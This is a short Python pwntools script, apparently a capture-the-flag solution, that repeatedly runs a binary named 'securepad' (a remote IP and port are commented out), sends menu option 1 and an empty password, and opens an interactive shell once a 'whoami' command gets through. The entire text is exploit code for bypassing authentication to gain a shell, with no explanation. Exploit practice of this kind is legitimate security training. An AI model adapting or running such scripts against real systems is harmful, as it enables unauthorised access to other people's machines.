from pwn import *
context.log_level = 'error'
for i in range(1000):
  #conn = remote("18.224.57.15",  1337)
  conn = process("./securepad")
  conn.recvuntil(">>> ")
  conn.sendline("1")
  conn.recvuntil("password\n")
  conn.sendline("")
  conn.sendline("whoami")
  print(i)
  if "Enter" not in conn.recvline(timeout=1):
    print("pwned")
    conn.interactive()
  conn.close()
